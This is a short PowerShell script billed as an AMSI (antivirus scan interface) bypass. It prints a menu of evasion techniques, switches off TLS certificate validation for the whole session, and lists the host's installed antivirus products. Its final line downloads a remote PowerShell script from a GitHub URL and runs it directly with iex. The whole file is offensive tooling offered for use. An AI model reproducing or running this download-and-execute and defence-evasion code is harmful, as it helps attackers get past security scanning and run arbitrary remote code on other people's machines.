

function AV-Bypass-Setup
<#
.SYNOPSIS
	PowerShell AMSI Bypass.
	Resources:
	  - @_xpn_ => https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
.DESCRIPTION
	Author: @b4rtic
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	C:\PS> AV-Bypass-Setup
#>
{ 
	Write-host ""
	Write-host "AMSI evasion technique: "
	Write-host ""
	Write-host "1 Reflection "
	Write-host "2 Patching"
	Write-host "3 Error Forcing"
	Write-host ""
	
    
	
    #Needed for https call with fake cert
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;

}

function Get-AVStatus {
 
	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
}

Write-host ""
Write-host "Localhost AV Status"
Get-AVStatus
AV-Bypass-Setup

iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Console/PowerTheShell.ps1'))
